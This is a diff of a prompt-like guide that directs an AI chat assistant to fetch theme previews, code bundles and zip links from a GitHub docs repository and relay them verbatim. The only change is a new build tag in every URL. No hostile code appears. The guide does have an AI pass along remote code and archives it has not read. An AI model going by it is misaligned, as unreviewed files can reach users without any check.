@@ -27,7 +27,7 @@ showing them to me - same content, same paths.
 ## Step 1 - pick a theme (fetch ONE file)
 
 Fetch RAW
-https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/theme-gallery.html
+https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/guides/theme-gallery.html
 and give it back to me as
 gallery.html, exactly as it is, character for character - same CSS,
 markup, links and base64 "data:image" picture - so this chat shows it
@@ -71,23 +71,23 @@ Each theme's preview is a finished file. Its name (the "slug") is the
 theme name in lower case with dashes: 1 classic-card, 2 social-card, 3 modern-card, 4 classic-photo, 5 square-photo, 6 collage, 7 vivid, 8 horizontal-slider, 9 horizontal-columns, 10 slider, 11 reels, 12 story-theme, 13 single-post, 14 widget-theme, 15 review-box, 16 review-carousel, 17 review-list.
 
 Fetch RAW the preview of the theme I picked - its number in this list:
-1. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/classic-card.html
-2. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/social-card.html
-3. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/modern-card.html
-4. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/classic-photo.html
-5. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/square-photo.html
-6. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/collage.html
-7. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/vivid.html
-8. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/horizontal-slider.html
-9. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/horizontal-columns.html
-10. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/slider.html
-11. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/reels.html
-12. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/story-theme.html
-13. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/single-post.html
-14. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/widget-theme.html
-15. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/review-box.html
-16. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/review-carousel.html
-17. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/review-list.html
+1. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/guides/previews/classic-card.html
+2. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/guides/previews/social-card.html
+3. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/guides/previews/modern-card.html
+4. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/guides/previews/classic-photo.html
+5. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/guides/previews/square-photo.html
+6. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/guides/previews/collage.html
+7. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/guides/previews/vivid.html
+8. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/guides/previews/horizontal-slider.html
+9. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/guides/previews/horizontal-columns.html
+10. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/guides/previews/slider.html
+11. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/guides/previews/reels.html
+12. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/guides/previews/story-theme.html
+13. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/guides/previews/single-post.html
+14. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/guides/previews/widget-theme.html
+15. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/guides/previews/review-box.html
+16. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/guides/previews/review-carousel.html
+17. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/guides/previews/review-list.html
 and give it back to me as
 preview.html, exactly as it is, character for character - same CSS,
 markup, sample posts, image URLs and base64 "data:image" thumbnails -
@@ -143,10 +143,10 @@ open or read these files whole from this chat, and the finished zip
 already exists. For PHP /
 Node.js / React / Simple HTML reply with only:
 - the download link for my stack:
-  - PHP: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/dist/social-widget-php.zip
-  - Node.js: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/dist/social-widget-nodejs.zip
-  - React: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/dist/social-widget-react.zip
-  - Simple HTML: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/dist/social-widget-html.zip
+  - PHP: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/dist/social-widget-php.zip
+  - Node.js: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/dist/social-widget-nodejs.zip
+  - React: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/dist/social-widget-react.zip
+  - Simple HTML: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/dist/social-widget-html.zip
   - finished code, every theme, the sample posts and README.md;
 - .env as a code block: ACCESS_TOKEN= (empty),
   API_BASE_URL=https://api.tagembed.com/api, WIDGET_THEME=<slug>;
@@ -162,45 +162,45 @@ The code for every stack is finished. Fetch RAW these three
 - nothing else:
 1. My stack's files, all in one text file - each file starts with a
    line "===== FILE: <path> =====":
-   - PHP:         https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/dist/social-widget-php.txt
-   - Node.js:     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/dist/social-widget-nodejs.txt
-   - React:       https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/dist/social-widget-react.txt
-   - Simple HTML: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/dist/social-widget-html.txt
+   - PHP:         https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/dist/social-widget-php.txt
+   - Node.js:     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/dist/social-widget-nodejs.txt
+   - React:       https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/dist/social-widget-react.txt
+   - Simple HTML: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/dist/social-widget-html.txt
 2. and 3. My theme's .css and .json:
-   - classic-card: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/classic-card.css and
-     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/classic-card.json
-   - social-card: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/social-card.css and
-     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/social-card.json
-   - modern-card: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/modern-card.css and
-     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/modern-card.json
-   - classic-photo: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/classic-photo.css and
-     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/classic-photo.json
-   - square-photo: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/square-photo.css and
-     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/square-photo.json
-   - collage: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/collage.css and
-     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/collage.json
-   - vivid: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/vivid.css and
-     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/vivid.json
-   - horizontal-slider: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/horizontal-slider.css and
-     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/horizontal-slider.json
-   - horizontal-columns: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/horizontal-columns.css and
-     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/horizontal-columns.json
-   - slider: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/slider.css and
-     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/slider.json
-   - reels: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/reels.css and
-     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/reels.json
-   - story-theme: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/story-theme.css and
-     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/story-theme.json
-   - single-post: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/single-post.css and
-     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/single-post.json
-   - widget-theme: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/widget-theme.css and
-     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/widget-theme.json
-   - review-box: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/review-box.css and
-     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/review-box.json
-   - review-carousel: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/review-carousel.css and
-     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/review-carousel.json
-   - review-list: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/review-list.css and
-     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/review-list.json
+   - classic-card: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/classic-card.css and
+     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/classic-card.json
+   - social-card: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/social-card.css and
+     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/social-card.json
+   - modern-card: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/modern-card.css and
+     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/modern-card.json
+   - classic-photo: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/classic-photo.css and
+     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/classic-photo.json
+   - square-photo: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/square-photo.css and
+     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/square-photo.json
+   - collage: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/collage.css and
+     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/collage.json
+   - vivid: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/vivid.css and
+     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/vivid.json
+   - horizontal-slider: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/horizontal-slider.css and
+     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/horizontal-slider.json
+   - horizontal-columns: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/horizontal-columns.css and
+     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/horizontal-columns.json
+   - slider: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/slider.css and
+     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/slider.json
+   - reels: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/reels.css and
+     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/reels.json
+   - story-theme: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/story-theme.css and
+     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/story-theme.json
+   - single-post: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/single-post.css and
+     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/single-post.json
+   - widget-theme: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/widget-theme.css and
+     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/widget-theme.json
+   - review-box: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/review-box.css and
+     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/review-box.json
+   - review-carousel: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/review-carousel.css and
+     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/review-carousel.json
+   - review-list: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/review-list.css and
+     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28d/templates/themes/review-list.json
 
 Hand every file over here in the chat, each as its own code block
 headed with its path, ready to save - exactly as fetched, character for
